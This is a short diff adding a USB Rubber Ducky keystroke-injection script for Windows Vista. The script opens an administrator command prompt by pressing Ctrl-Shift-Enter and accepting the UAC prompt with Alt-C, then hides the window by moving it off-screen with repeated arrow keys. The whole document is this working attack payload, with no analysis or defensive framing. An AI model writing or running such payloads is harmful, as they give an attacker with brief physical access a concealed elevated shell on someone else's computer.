@@ -1,0 +1,17 @@
+REM Target: WINDOWS VISTA
+REM Encoder V2.4
+REM Purpose: Hide cmd window script that uses a key combo to circumvent UAC limitations. 
+DELAY 3000
+CONTROL ESCAPE
+DELAY 500
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT C
+DELAY 750
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
